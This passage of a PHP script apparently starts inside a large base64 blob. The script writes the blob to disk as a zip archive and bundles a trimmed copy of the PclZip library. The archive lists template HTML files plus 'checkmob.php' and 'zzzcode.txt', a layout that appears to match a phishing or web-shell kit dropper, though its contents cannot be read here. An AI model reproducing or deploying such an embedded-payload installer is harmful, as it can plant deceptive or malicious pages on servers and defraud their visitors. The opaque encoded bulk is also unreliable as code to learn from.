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"); 
file_put_contents($foldername."/".$myfilename.".zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
